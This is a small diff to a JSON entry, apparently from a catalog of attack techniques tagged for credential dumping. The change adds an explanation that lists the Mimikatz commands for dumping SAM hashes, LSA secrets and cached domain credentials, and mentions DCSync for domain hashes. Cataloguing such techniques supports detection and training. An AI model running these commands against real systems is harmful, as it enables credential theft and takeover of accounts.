@@ -147,5 +147,6 @@
     "sam",
     "lsa-secrets",
     "credential-dumping"
-  ]
+  ],
+  "explain": "Dumps the local SAM and LSA secrets with Mimikatz (needs SYSTEM):\n  privilege::debug         acquire debug privilege\n  token::elevate           steal a SYSTEM token to read the hives\n  lsadump::sam             extract local account NTLM hashes\n  lsadump::lsa /patch      extract LSA secrets, service account passwords, and cached domain creds\nlsadump::dcsync (in the same tool) pulls domain hashes via replication when you have the rights."
 }
